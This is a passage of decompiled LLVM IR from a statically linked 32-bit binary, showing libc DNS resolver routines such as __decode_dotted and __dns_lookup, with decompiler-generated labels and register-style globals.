  %v1_8064d27 = icmp eq i1 %v1_8064d25, false
  br i1 %v1_8064d27, label %dec_label_pc_8064d13, label %dec_label_pc_8064d29

dec_label_pc_8064d29:                             ; preds = %dec_label_pc_8064d22
  %v1_8064d29 = inttoptr i32 %v0_8064d16 to i32*
  %v2_8064d29 = load i32, i32* %v1_8064d29, align 4
  %v3_8064d29 = icmp eq i32 %v2_8064d29, 0
  %v1_8064d2c = icmp eq i1 %v3_8064d29, false
  br i1 %v1_8064d2c, label %dec_label_pc_8064d13, label %dec_label_pc_8064d2e

dec_label_pc_8064d2e:                             ; preds = %dec_label_pc_8064d29
  %v0_8064d2e = load i32, i32* @esi, align 4
  %v2_8064d33 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8064d33, i32* @ebx, align 4
  store i32 %v0_8064d06, i32* @esi, align 4
  %v1_8064d35 = call i32 @free(i32 %v0_8064d2e)
  ret i32 %v1_8064d35

; uselistorder directives
  uselistorder i32 %v3_8064d22, { 1, 0 }
  uselistorder i32 %v0_8064d16, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8064d22, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8064d3d = load i32, i32* @edi, align 4
  %v0_8064d3e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8064d47 = icmp eq i32 %arg1, 0
  br i1 %v4_8064d47, label %dec_label_pc_8064e08, label %dec_label_pc_8064d52

dec_label_pc_8064d52:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8064df02740 = add i32 %arg2, %arg1
  %v3_8064df02841 = inttoptr i32 %v2_8064df02740 to i8*
  %v4_8064df02942 = load i8, i8* %v3_8064df02841, align 1
  %v1_8064df43144 = icmp eq i8 %v4_8064df02942, 0
  %v1_8064df63245 = icmp eq i1 %v1_8064df43144, false
  br i1 %v1_8064df63245, label %dec_label_pc_8064d60.lr.ph, label %dec_label_pc_8064dfc

dec_label_pc_8064d60:                             ; preds = %dec_label_pc_8064d60.lr.ph, %dec_label_pc_8064d79
  %v0_8064d6a = phi i32 [ %v0_8064d6a.pre, %dec_label_pc_8064d60.lr.ph ], [ %v4_8064d84, %dec_label_pc_8064d79 ]
  %v8_8064d6038 = phi i1 [ %v8_8064d603350, %dec_label_pc_8064d60.lr.ph ], [ true, %dec_label_pc_8064d79 ]
  %v5_8064df037.in = phi i8 [ %v5_8064df03049.in, %dec_label_pc_8064d60.lr.ph ], [ %v4_8064df0, %dec_label_pc_8064d79 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8064d60.lr.ph ], [ 0, %dec_label_pc_8064d79 ]
  %v0_8064d6735 = phi i32 [ %v0_8064d67.ph46, %dec_label_pc_8064d60.lr.ph ], [ %v2_8064d93, %dec_label_pc_8064d79 ]
  %v5_8064df037 = zext i8 %v5_8064df037.in to i32
  %v1_8064d67 = add i32 %v0_8064d6735, 1
  store i32 %v1_8064d67, i32* @esi, align 4
  %v3_8064d6a = select i1 %v8_8064d6038, i32 2, i32 1
  %v4_8064d6a = add i32 %v3_8064d6a, %v0_8064d6a
  store i32 %v4_8064d6a, i32* %ebp.global-to-local, align 4
  %v1_8064d6d = and i32 %v5_8064df037, 192
  %v6_8064d72 = icmp eq i32 %v1_8064d6d, 192
  %v1_8064d77 = icmp eq i1 %v6_8064d72, false
  br i1 %v1_8064d77, label %dec_label_pc_8064d9c, label %dec_label_pc_8064d79

dec_label_pc_8064d79:                             ; preds = %dec_label_pc_8064d60
  %v4_8064d84 = add i32 %v3_8064d6a, %v4_8064d6a
  store i32 %v4_8064d84, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_8064df037.in, 64
  %v1_8064d87 = zext i8 %tmp to i32
  %v2_8064d8a = add i32 %v1_8064d67, %arg1
  %v3_8064d8a = inttoptr i32 %v2_8064d8a to i8*
  %v4_8064d8a = load i8, i8* %v3_8064d8a, align 1
  %v5_8064d8a = zext i8 %v4_8064d8a to i32
  %v2_8064d8e = mul nuw nsw i32 %v1_8064d87, 256
  %v2_8064d93 = or i32 %v5_8064d8a, %v2_8064d8e
  store i32 %v2_8064d93, i32* @edx, align 4
  store i32 %v1_8064db9.ph47, i32* @ecx, align 4
  %v2_8064df0 = add i32 %v2_8064d93, %arg1
  %v3_8064df0 = inttoptr i32 %v2_8064df0 to i8*
  %v4_8064df0 = load i8, i8* %v3_8064df0, align 1
  %v1_8064df4 = icmp eq i8 %v4_8064df0, 0
  %v1_8064df6 = icmp eq i1 %v1_8064df4, false
  br i1 %v1_8064df6, label %dec_label_pc_8064d60, label %dec_label_pc_8064dfc

dec_label_pc_8064d9c:                             ; preds = %dec_label_pc_8064d60
  %v2_8064d9c = add i32 %v5_8064df037, %v1_8064db9.ph47
  %v1_8064da5 = add i32 %v2_8064d9c, 1
  store i32 %v1_8064da5, i32* @edi, align 4
  %v10_8064da6 = icmp ult i32 %v1_8064da5, %arg4
  %v1_8064daa = icmp eq i1 %v10_8064da6, false
  br i1 %v1_8064daa, label %dec_label_pc_8064e08, label %dec_label_pc_8064dac

dec_label_pc_8064dac:                             ; preds = %dec_label_pc_8064d9c
  %v2_8064db2 = add i32 %v1_8064d67, %arg1
  %v2_8064db9 = add i32 %v1_8064db9.ph47, %arg3
  %v3_8064dbc = inttoptr i32 %v2_8064db9 to i16*
  %v4_8064dbc = call i32 @memcpy(i16* %v3_8064dbc, i32 %v2_8064db2, i32 %v5_8064df037)
  %v0_8064dc4 = load i32, i32* @esi, align 4
  %v2_8064dc4 = add i32 %v0_8064dc4, %v5_8064df037
  store i32 %v2_8064dc4, i32* @edx, align 4
  br i1 %v8_8064d6038, label %dec_label_pc_8064dd0, label %dec_label_pc_8064dce

dec_label_pc_8064dce:                             ; preds = %dec_label_pc_8064dac
  %v0_8064dce = load i32, i32* %ebp.global-to-local, align 4
  %v2_8064dce = add i32 %v0_8064dce, %v5_8064df037
  store i32 %v2_8064dce, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8064dd0

dec_label_pc_8064dd0:                             ; preds = %dec_label_pc_8064dac, %dec_label_pc_8064dce
  %v4_8064de7 = add i32 %v2_8064d9c, %arg3
  %v5_8064de7 = inttoptr i32 %v4_8064de7 to i8*
  store i8 46, i8* %v5_8064de7, align 1
  %v0_8064dea.pre = load i32, i32* @edi, align 4
  %v1_8064df0.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8064dea.pre, i32* @ecx, align 4
  %v2_8064df027 = add i32 %v1_8064df0.pre.pre, %arg1
  %v3_8064df028 = inttoptr i32 %v2_8064df027 to i8*
  %v4_8064df029 = load i8, i8* %v3_8064df028, align 1
  %v1_8064df431 = icmp eq i8 %v4_8064df029, 0
  %v1_8064df632 = icmp eq i1 %v1_8064df431, false
  %v8_8064d6033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8064d6a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8064df632, label %dec_label_pc_8064d60.lr.ph, label %dec_label_pc_8064dfc

dec_label_pc_8064d60.lr.ph:                       ; preds = %dec_label_pc_8064dd0, %dec_label_pc_8064d52
  %v0_8064d6a.pre = phi i32 [ 0, %dec_label_pc_8064d52 ], [ %v0_8064d6a.pre.pre, %dec_label_pc_8064dd0 ]
  %v8_8064d603350 = phi i1 [ false, %dec_label_pc_8064d52 ], [ %v8_8064d6033, %dec_label_pc_8064dd0 ]
  %v5_8064df03049.in = phi i8 [ %v4_8064df02942, %dec_label_pc_8064d52 ], [ %v4_8064df029, %dec_label_pc_8064dd0 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8064d52 ], [ %stack_var_-17.136, %dec_label_pc_8064dd0 ]
  %v1_8064db9.ph47 = phi i32 [ 0, %dec_label_pc_8064d52 ], [ %v0_8064dea.pre, %dec_label_pc_8064dd0 ]
  %v0_8064d67.ph46 = phi i32 [ %arg2, %dec_label_pc_8064d52 ], [ %v1_8064df0.pre.pre, %dec_label_pc_8064dd0 ]
  br label %dec_label_pc_8064d60

dec_label_pc_8064dfc:                             ; preds = %dec_label_pc_8064dd0, %dec_label_pc_8064d79, %dec_label_pc_8064d52
  %v0_8064e01 = phi i32 [ 0, %dec_label_pc_8064d52 ], [ %v4_8064d84, %dec_label_pc_8064d79 ], [ %v0_8064d6a.pre.pre, %dec_label_pc_8064dd0 ]
  %v8_8064d60.lcssa = phi i1 [ false, %dec_label_pc_8064d52 ], [ true, %dec_label_pc_8064d79 ], [ %v8_8064d6033, %dec_label_pc_8064dd0 ]
  %v2_8064e03 = zext i1 %v8_8064d60.lcssa to i32
  %v3_8064e03 = add i32 %v0_8064e01, 1
  %v4_8064e03 = add i32 %v3_8064e03, %v2_8064e03
  br label %dec_label_pc_8064e0b

dec_label_pc_8064e08:                             ; preds = %dec_label_pc_8064d9c, %entry
  br label %dec_label_pc_8064e0b

dec_label_pc_8064e0b:                             ; preds = %dec_label_pc_8064dfc, %dec_label_pc_8064e08
  %storemerge = phi i32 [ -1, %dec_label_pc_8064e08 ], [ %v4_8064e03, %dec_label_pc_8064dfc ]
  store i32 %v0_8064d3e, i32* @esi, align 4
  store i32 %v0_8064d3d, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8064db9.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8064df0, { 1, 0 }
  uselistorder i32 %v2_8064d93, { 0, 2, 1 }
  uselistorder i32 %v4_8064d84, { 0, 2, 1 }
  uselistorder i32 %v5_8064df037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 46, { 6, 8, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i1 true, { 2, 11, 18, 13, 15, 16, 17, 3, 4, 5, 6, 7, 8, 14, 0, 12, 1, 9, 10 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8064e0b, { 1, 0 }
  uselistorder label %dec_label_pc_8064dd0, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp37 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8064e2a = call i32 @malloc(i32 512)
  store i32 %v2_8064e2a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8064e2a, i32* @ebp, align 4
  %v2_8064e38 = call i32 @malloc(i32 1025)
  store i32 %v2_8064e38, i32* %eax.global-to-local, align 4
  %v12_8064e41 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8064e44 = icmp eq i32 %v2_8064e2a, 0
  br i1 %v1_8064e44, label %dec_label_pc_80654bd, label %dec_label_pc_8064e4c

dec_label_pc_8064e4c:                             ; preds = %entry
  %v1_8064e4c = icmp eq i32 %v2_8064e38, 0
  br i1 %v1_8064e4c, label %dec_label_pc_80654bd, label %dec_label_pc_8064e54

dec_label_pc_8064e54:                             ; preds = %dec_label_pc_8064e4c
  %v5_8064e54 = icmp eq i32 %arg2, 0
  br i1 %v5_8064e54, label %dec_label_pc_80654bd, label %dec_label_pc_8064e62

dec_label_pc_8064e62:                             ; preds = %dec_label_pc_8064e54
  %v4_8064e62 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8064e62, i32* %eax.global-to-local, align 4
  %v2_8064e69 = load i8, i8* %arg1, align 1
  %v3_8064e69 = icmp eq i8 %v2_8064e69, 0
  br i1 %v3_8064e69, label %dec_label_pc_80654bd, label %dec_label_pc_8064e72

dec_label_pc_8064e72:                             ; preds = %dec_label_pc_8064e62
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8064e76 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8064e76, i32* %eax.global-to-local, align 4
  store i32 %v4_8064e62, i32* %edx.global-to-local, align 4
  %v2_8064e99 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8064e99, i32* @ebx, align 4
  %tmp50 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp50, i8** %stack_var_-252, align 4
  %v6_8064ea1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 134583465, i32 ptrtoint (i8** @global_var_807ca1c.880 to i32))
  store i32 %v6_8064ea1, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_807ca1c.880 to i8*), i8** %stack_var_-252, align 4
  %v2_8064ead = call i32 @pthread_mutex_lock(i32 ptrtoint (i8** @global_var_807ca1c.880 to i32))
  %v0_8064eb2 = load i64, i64* @global_var_807ca34.881, align 8
  %v1_8064eb2 = trunc i64 %v0_8064eb2 to i32
  %v1_8064eb7 = ashr i32 %v1_8064eb2, 31
  %v6_8064eb8 = and i64 %v0_8064eb2, 4294967295
  %v8_8064eb8 = zext i32 %v1_8064eb7 to i64
  %v9_8064eb8 = mul nuw i64 %v8_8064eb8, 4294967296
  %v10_8064eb8 = or i64 %v9_8064eb8, %v6_8064eb8
  %v14_8064eb8 = srem i64 %v10_8064eb8, %tmp37
  %v15_8064eb8 = trunc i64 %v14_8064eb8 to i32
  %v0_8064ebf = load i16, i16* @global_var_8074008.882, align 8
  %v2_8064ece = load i8*, i8** %stack_var_-252, align 4
  %v3_8064ece = ptrtoint i8* %v2_8064ece to i32
  store i32 %v3_8064ece, i32* %eax.global-to-local, align 4
  store i32 134583465, i32* %edx.global-to-local, align 4
  store i8* %tmp50, i8** %stack_var_-252, align 4
  %v4_8064ed3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-52, i32 1)
  store i32 %v4_8064ed3, i32* %eax.global-to-local, align 4
  %v3_8064f17 = sext i16 %v0_8064ebf to i32
  %v4_806507a = inttoptr i32 %v15_8064eb8 to i8*
  %v1_806549891 = add i32 %v12_8064e41, 28
  %v2_806549892 = inttoptr i32 %v1_806549891 to i32*
  %v3_806549893 = load i32, i32* %v2_806549892, align 4
  %tmp126 = icmp ult i32 %v3_806549893, 3
  br i1 %tmp126, label %dec_label_pc_8064ef8, label %dec_label_pc_80654bd

dec_label_pc_8064ef8:                             ; preds = %dec_label_pc_8064e72, %dec_label_pc_8065498.backedge
  %v0_8064eff99 = phi i32 [ %v0_8065498.pre, %dec_label_pc_8065498.backedge ], [ %v12_8064e41, %dec_label_pc_8064e72 ]
  %v1_8064ef8 = add i32 %v0_8064eff99, 20
  %v2_8064ef8 = inttoptr i32 %v1_8064ef8 to i32*
  %v3_8064ef8 = load i32, i32* %v2_8064ef8, align 4
  %v13_8064ef8 = icmp eq i32 %v3_8064ef8, -1
  br i1 %v13_8064ef8, label %dec_label_pc_8064ef8.dec_label_pc_8064f0e_crit_edge, label %dec_label_pc_8064eff

dec_label_pc_8064ef8.dec_label_pc_8064f0e_crit_edge: ; preds = %dec_label_pc_8064ef8
  %v0_8064f0e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064f0e

dec_label_pc_8064eff:                             ; preds = %dec_label_pc_8064ef8
  %v3_8064f02 = load i32, i32* %v2_8064ef8, align 4
  %v5_8064f02 = add i32 %v0_8064eff99, -16
  %v6_8064f02 = inttoptr i32 %v5_8064f02 to i32*
  store i32 %v3_8064f02, i32* %v6_8064f02, align 4
  %v1_8064f06 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8064f06, i32* %eax.global-to-local, align 4
  %v0_8064f0b = load i32, i32* @esp, align 4
  %v1_8064f0b = add i32 %v0_8064f0b, 16
  br label %dec_label_pc_8064f0e

dec_label_pc_8064f0e:                             ; preds = %dec_label_pc_8064ef8.dec_label_pc_8064f0e_crit_edge, %dec_label_pc_8064eff
  %v1_8064f0e = phi i32 [ %v0_8064eff99, %dec_label_pc_8064ef8.dec_label_pc_8064f0e_crit_edge ], [ %v1_8064f0b, %dec_label_pc_8064eff ]
  %v0_8064f0e = phi i32 [ %v0_8064f0e.pre, %dec_label_pc_8064ef8.dec_label_pc_8064f0e_crit_edge ], [ %v1_8064f06, %dec_label_pc_8064eff ]
  %v2_8064f0e = add i32 %v1_8064f0e, -4
  %v3_8064f0e = inttoptr i32 %v2_8064f0e to i32*
  store i32 %v0_8064f0e, i32* %v3_8064f0e, align 4
  %v1_8064f0f = add i32 %v1_8064f0e, -8
  %v2_8064f0f = inttoptr i32 %v1_8064f0f to i32*
  store i32 512, i32* %v2_8064f0f, align 4
  %v1_8064f14 = add i32 %v1_8064f0e, -12
  %v2_8064f14 = inttoptr i32 %v1_8064f14 to i32*
  store i32 0, i32* %v2_8064f14, align 4
  %v2_8064f16 = add i32 %v1_8064f0e, -16
  %v3_8064f16 = inttoptr i32 %v2_8064f16 to i32*
  store i32 %v2_8064e2a, i32* %v3_8064f16, align 4
  %v5_8064f17 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_8064f17, i32* %eax.global-to-local, align 4
  %v0_8064f1c = load i32, i32* @esp, align 4
  %v1_8064f1f = add i32 %v0_8064f1c, 8
  %v2_8064f1f = inttoptr i32 %v1_8064f1f to i32*
  store i32 48, i32* %v2_8064f1f, align 4
  %v1_8064f21 = add i32 %v0_8064f1c, 4
  %v2_8064f21 = inttoptr i32 %v1_8064f21 to i32*
  store i32 0, i32* %v2_8064f21, align 4
  %v1_8064f23 = add i32 %v0_8064f1c, 84
  store i32 %v1_8064f23, i32* @ebx, align 4
  %v3_8064f27 = inttoptr i32 %v0_8064f1c to i32*
  store i32 %v1_8064f23, i32* %v3_8064f27, align 4
  %v5_8064f28 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_8064f28, i32* %eax.global-to-local, align 4
  %v0_8064f2d = load i32, i32* @esp, align 4
  %v1_8064f2d = add i32 %v0_8064f2d, 60
  %v2_8064f2d = inttoptr i32 %v1_8064f2d to i32*
  %v3_8064f2d = load i32, i32* %v2_8064f2d, align 4
  store i32 %v3_8064f2d, i32* %eax.global-to-local, align 4
  %v1_8064f31 = add i32 %v0_8064f2d, 116
  %v2_8064f31 = inttoptr i32 %v1_8064f31 to i32*
  store i32 1, i32* %v2_8064f31, align 4
  %v0_8064f39 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064f39 = add i32 %v0_8064f39, 1
  %v0_8064f3a = load i32, i32* @esp, align 4
  %v1_8064f3a = add i32 %v0_8064f3a, 104
  %v2_8064f3a = inttoptr i32 %v1_8064f3a to i32*
  store i32 1, i32* %v2_8064f3a, align 4
  %v1_8064f42 = urem i32 %v1_8064f39, 65536
  store i32 %v1_8064f42, i32* %eax.global-to-local, align 4
  %v1_8064f47 = load i32, i32* @esp, align 4
  %v2_8064f47 = add i32 %v1_8064f47, 60
  %v3_8064f47 = inttoptr i32 %v2_8064f47 to i32*
  store i32 %v1_8064f42, i32* %v3_8064f47, align 4
  %v0_8064f4b = load i32, i32* %eax.global-to-local, align 4
  %v1_8064f4b = load i32, i32* @esp, align 4
  %v2_8064f4b = add i32 %v1_8064f4b, 84
  %v3_8064f4b = inttoptr i32 %v2_8064f4b to i32*
  store i32 %v0_8064f4b, i32* %v3_8064f4b, align 4
  %v0_8064f4f = load i32, i32* @esp, align 4
  %v1_8064f52 = add i32 %v0_8064f4f, 8
  %v2_8064f52 = inttoptr i32 %v1_8064f52 to i32*
  store i32 512, i32* %v2_8064f52, align 4
  %v2_8064f57 = add i32 %v0_8064f4f, 4
  %v3_8064f57 = inttoptr i32 %v2_8064f57 to i32*
  store i32 %v2_8064e2a, i32* %v3_8064f57, align 4
  %v0_8064f58 = load i32, i32* @ebx, align 4
  %v3_8064f58 = inttoptr i32 %v0_8064f4f to i32*
  store i32 %v0_8064f58, i32* %v3_8064f58, align 4
  %v0_8064f59 = call i32 @__encode_header()
  store i32 %v0_8064f59, i32* %eax.global-to-local, align 4
  %v0_8064f5e = load i32, i32* @esp, align 4
  store i32 %v0_8064f59, i32* @ebx, align 4
  %v2_8064f63 = icmp slt i32 %v0_8064f59, 0
  br i1 %v2_8064f63, label %dec_label_pc_80654bd, label %dec_label_pc_8064f6b

dec_label_pc_8064f6b:                             ; preds = %dec_label_pc_8064f0e
  %v2_8064f6b = add i32 %v0_8064f5e, 12
  %v3_8064f6b = inttoptr i32 %v2_8064f6b to i32*
  store i32 %v0_8064f59, i32* %v3_8064f6b, align 4
  %v1_8064f6c = add i32 %v0_8064f5e, 8
  %v2_8064f6c = inttoptr i32 %v1_8064f6c to i32*
  store i32 1025, i32* %v2_8064f6c, align 4
  %v1_8064f71 = add i32 %v0_8064f5e, 256
  %v2_8064f71 = inttoptr i32 %v1_8064f71 to i32*
  %v3_8064f71 = load i32, i32* %v2_8064f71, align 4
  %v5_8064f71 = add i32 %v0_8064f5e, 4
  %v6_8064f71 = inttoptr i32 %v5_8064f71 to i32*
  store i32 %v3_8064f71, i32* %v6_8064f71, align 4
  %v1_8064f78 = add i32 %v0_8064f5e, 28
  %v2_8064f78 = inttoptr i32 %v1_8064f78 to i32*
  %v3_8064f78 = load i32, i32* %v2_8064f78, align 4
  %v6_8064f78 = inttoptr i32 %v0_8064f5e to i32*
  store i32 %v3_8064f78, i32* %v6_8064f78, align 4
  %v5_8064f7c = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8064eb8, i32 %v3_8064f17)
  %v0_8064f81 = load i32, i32* @esp, align 4
  %v1_8064f84 = add i32 %v0_8064f81, 8
  %v2_8064f84 = inttoptr i32 %v1_8064f84 to i32*
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %v2_8064f84, align 4
  %v1_8064f89 = add i32 %v0_8064f81, 4
  %v2_8064f89 = inttoptr i32 %v1_8064f89 to i32*
  store i32 134583465, i32* %v2_8064f89, align 4
  %v1_8064f8e = add i32 %v0_8064f81, 200
  store i32 %v1_8064f8e, i32* %eax.global-to-local, align 4
  %v3_8064f95 = inttoptr i32 %v0_8064f81 to i32*
  store i32 %v1_8064f8e, i32* %v3_8064f95, align 4
  %v5_8064f96 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_8064f96, i32* %eax.global-to-local, align 4
  %v0_8064f9b = load i32, i32* @esp, align 4
  %v1_8064f9b = inttoptr i32 %v0_8064f9b to i32*
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %v1_8064f9b, align 4
  %v1_8064fa2 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8064fa2, i32* %eax.global-to-local, align 4
  %v0_8064fa7 = load i32, i32* @esp, align 4
  %v1_8064fa7 = add i32 %v0_8064fa7, 56
  %v2_8064fa7 = inttoptr i32 %v1_8064fa7 to i32*
  %v3_8064fa7 = load i32, i32* %v2_8064fa7, align 4
  store i32 %v3_8064fa7, i32* %edx.global-to-local, align 4
  %v1_8064fab = add i32 %v0_8064fa7, 268
  %v2_8064fab = inttoptr i32 %v1_8064fab to i32*
  %v3_8064fab = load i32, i32* %v2_8064fab, align 4
  store i32 %v3_8064fab, i32* %eax.global-to-local, align 4
  %v2_8064fb2 = mul i32 %v3_8064fa7, 4
  %v3_8064fb2 = add i32 %v3_8064fab, %v2_8064fb2
  %v4_8064fb2 = inttoptr i32 %v3_8064fb2 to i32*
  %v5_8064fb2 = load i32, i32* %v4_8064fb2, align 4
  store i32 %v5_8064fb2, i32* %edx.global-to-local, align 4
  %v2_8064fb5 = add i32 %v0_8064fa7, 48
  %v3_8064fb5 = inttoptr i32 %v2_8064fb5 to i32*
  store i32 %v5_8064fb2, i32* %v3_8064fb5, align 4
  %v0_8064fb9 = load i32, i32* @esp, align 4
  %v1_8064fb9 = add i32 %v0_8064fb9, 16
  %v1_8064fbc = add i32 %v0_8064fb9, 52
  %v2_8064fbc = inttoptr i32 %v1_8064fbc to i32*
  %v3_8064fbc = load i32, i32* %v2_8064fbc, align 4
  %v5_8064fbc = icmp slt i32 %v3_8064fbc, 0
  br i1 %v5_8064fbc, label %dec_label_pc_8064f6b.dec_label_pc_8065002_crit_edge, label %dec_label_pc_8064fc3

dec_label_pc_8064f6b.dec_label_pc_8065002_crit_edge: ; preds = %dec_label_pc_8064f6b
  %v0_8065002.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065002

dec_label_pc_8064fc3:                             ; preds = %dec_label_pc_8064f6b
  store i32 %v3_8064fbc, i32* %eax.global-to-local, align 4
  %v1_8064fc7 = load i32, i32* @global_var_807e564.883, align 4
  %v2_8064fc7 = sub i32 %v3_8064fbc, %v1_8064fc7
  %v8_8064fc7 = xor i32 %v1_8064fc7, %v3_8064fbc
  %v9_8064fc7 = xor i32 %v2_8064fc7, %v3_8064fbc
  %v10_8064fc7 = and i32 %v9_8064fc7, %v8_8064fc7
  %v11_8064fc7 = icmp slt i32 %v10_8064fc7, 0
  %v13_8064fc7 = icmp slt i32 %v2_8064fc7, 0
  %v2_8064fcd = icmp eq i1 %v13_8064fc7, %v11_8064fc7
  br i1 %v2_8064fcd, label %dec_label_pc_8065002, label %dec_label_pc_8064fcf

dec_label_pc_8064fcf:                             ; preds = %dec_label_pc_8064fc3
  %v2_8064fcf = add i32 %v0_8064fb9, 12
  %v3_8064fcf = inttoptr i32 %v2_8064fcf to i32*
  store i32 %v3_8064fbc, i32* %v3_8064fcf, align 4
  %v1_8064fd0 = add i32 %v0_8064fb9, 8
  %v2_8064fd0 = inttoptr i32 %v1_8064fd0 to i32*
  store i32 1025, i32* %v2_8064fd0, align 4
  %v1_8064fd5 = add i32 %v0_8064fb9, 4
  %v2_8064fd5 = inttoptr i32 %v1_8064fd5 to i32*
  store i32 ptrtoint (i32* @global_var_806dae6.884 to i32), i32* %v2_8064fd5, align 4
  %v1_8064fda = add i32 %v0_8064fb9, 28
  %v2_8064fda = inttoptr i32 %v1_8064fda to i32*
  %v3_8064fda = load i32, i32* %v2_8064fda, align 4
  %v6_8064fda = inttoptr i32 %v0_8064fb9 to i32*
  store i32 %v3_8064fda, i32* %v6_8064fda, align 4
  %v0_8064fde = call i32 @__GI_strncat()
  store i32 %v0_8064fde, i32* %eax.global-to-local, align 4
  %v0_8064fe3 = load i32, i32* @esp, align 4
  %v1_8064fe6 = add i32 %v0_8064fe3, 8
  %v2_8064fe6 = inttoptr i32 %v1_8064fe6 to i32*
  store i32 1025, i32* %v2_8064fe6, align 4
  %v1_8064feb = add i32 %v0_8064fe3, 52
  %v2_8064feb = inttoptr i32 %v1_8064feb to i32*
  %v3_8064feb = load i32, i32* %v2_8064feb, align 4
  store i32 %v3_8064feb, i32* %edx.global-to-local, align 4
  %v1_8064fef = mul i32 %v3_8064feb, 4
  %v2_8064fef = add i32 %v1_8064fef, 134735172
  %v3_8064fef = inttoptr i32 %v2_8064fef to i32*
  %v4_8064fef = load i32, i32* %v3_8064fef, align 4
  %v6_8064fef = add i32 %v0_8064fe3, 4
  %v7_8064fef = inttoptr i32 %v6_8064fef to i32*
  store i32 %v4_8064fef, i32* %v7_8064fef, align 4
  %v1_8064ff6 = add i32 %v0_8064fe3, 28
  %v2_8064ff6 = inttoptr i32 %v1_8064ff6 to i32*
  %v3_8064ff6 = load i32, i32* %v2_8064ff6, align 4
  %v6_8064ff6 = inttoptr i32 %v0_8064fe3 to i32*
  store i32 %v3_8064ff6, i32* %v6_8064ff6, align 4
  %v0_8064ffa = call i32 @__GI_strncat()
  store i32 %v0_8064ffa, i32* %eax.global-to-local, align 4
  %v0_8064fff = load i32, i32* @esp, align 4
  %v1_8064fff = add i32 %v0_8064fff, 16
  br label %dec_label_pc_8065002

dec_label_pc_8065002:                             ; preds = %dec_label_pc_8064f6b.dec_label_pc_8065002_crit_edge, %dec_label_pc_8064fc3, %dec_label_pc_8064fcf
  %v1_8065002 = phi i32 [ %v1_8064fb9, %dec_label_pc_8064f6b.dec_label_pc_8065002_crit_edge ], [ %v1_8064fb9, %dec_label_pc_8064fc3 ], [ %v1_8064fff, %dec_label_pc_8064fcf ]
  %v0_8065002 = phi i32 [ %v0_8065002.pre, %dec_label_pc_8064f6b.dec_label_pc_8065002_crit_edge ], [ %v3_8064fbc, %dec_label_pc_8064fc3 ], [ %v0_8064ffa, %dec_label_pc_8064fcf ]
  %v2_8065002 = add i32 %v1_8065002, -4
  %v3_8065002 = inttoptr i32 %v2_8065002 to i32*
  store i32 %v0_8065002, i32* %v3_8065002, align 4
  %v0_8065003 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065003 = add i32 %v1_8065002, -8
  %v3_8065003 = inttoptr i32 %v2_8065003 to i32*
  store i32 %v0_8065003, i32* %v3_8065003, align 4
  %v1_8065004 = add i32 %v1_8065002, -12
  %v2_8065004 = inttoptr i32 %v1_8065004 to i32*
  store i32 1, i32* %v2_8065004, align 4
  %v1_8065006 = add i32 %v1_8065002, 184
  store i32 %v1_8065006, i32* %eax.global-to-local, align 4
  %v2_806500d = add i32 %v1_8065002, -16
  %v3_806500d = inttoptr i32 %v2_806500d to i32*
  store i32 %v1_8065006, i32* %v3_806500d, align 4
